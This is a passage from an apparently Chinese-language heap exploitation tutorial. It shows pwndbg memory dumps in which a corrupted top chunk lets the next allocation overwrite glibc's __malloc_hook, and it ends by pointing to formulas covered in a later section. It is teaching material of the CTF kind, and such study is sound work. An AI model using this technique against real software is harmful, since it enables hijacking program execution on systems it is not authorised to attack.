#top_chunk\npwndbg&gt;\n之后，我们只要再次分配就可以控制 0x7ffff7dd1b10 处的 __malloc_hook 值了：\nC\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\npwndbg&gt; heap\nAllocated chunk\nAddr: 0x7ffff7dd1000\nSize: 0x7ffff7fdb000\npwndbg&gt; top_chunk\nTop chunk\nAddr: 0x7ffff7dd1b20\nSize: 0x-7ffff77cfb07\npwndbg&gt; x/20gx 0x7ffff7dd1b00\n0x7ffff7dd1b00 &lt;__memalign_hook&gt;:\t0x00007ffff7a92ea0\t0x0000000000000021#new_chunk\n0x7ffff7dd1b10 &lt;__malloc_hook&gt;:\t0x0000000000000000\t0x0000000000000000\n0x7ffff7dd1b20 &lt;main_arena&gt;:\t0x0000000100000000\t0xffff8000088304f9 #top_chunk\n0x7ffff7dd1b30 &lt;main_arena+16&gt;:\t0x0000000000000000\t0x0000000000000000\n0x7ffff7dd1b40 &lt;main_arena+32&gt;:\t0x0000000000000000\t0x0000000000000000\n0x7ffff7dd1b50 &lt;main_arena+48&gt;:\t0x0000000000000000\t0x0000000000000000\n0x7ffff7dd1b60 &lt;main_arena+64&gt;:\t0x0000000000000000\t0x0000000000000000\n0x7ffff7dd1b70 &lt;main_arena+80&gt;:\t0x0000000000000000\t0x00007ffff7dd1b20 #指向top_chunk\n0x7ffff7dd1b80 &lt;main_arena+96&gt;:\t0x0000000000000000\t0x00007ffff7dd1b78\n0x7ffff7dd1b90 &lt;main_arena+112&gt;:\t0x00007ffff7dd1b78\t0x00007ffff7dd1b88\npwndbg&gt;\n记住两个公式解题更简单，下一小节将会讲解。\n"}]